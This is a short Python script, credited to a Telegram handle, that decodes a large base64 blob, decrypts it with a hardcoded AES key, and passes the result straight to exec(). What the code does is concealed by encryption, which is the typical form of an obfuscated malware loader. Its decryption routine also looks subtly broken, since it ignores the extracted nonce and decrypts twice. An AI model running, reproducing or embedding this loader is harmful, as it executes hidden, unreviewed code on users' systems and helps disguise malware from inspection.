# Telegram: @rafi_broh


import base64
from Crypto.Cipher import AES

# AES decryption function
def decrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_EAX)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher.decrypt_and_verify(ciphertext, tag)
    return cipher.decrypt(ciphertext)

# Encrypted data
encrypted_data = base64.b64decode("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")

# AES key (must be the same as the one used for encryption)
aes_key = b'\xe4m\xe6\xf4\xfc\xd7!\x1c~\x00\xa1f\xd1jTq'

# Decrypt and execute
exec(decrypt_data(encrypted_data, aes_key))
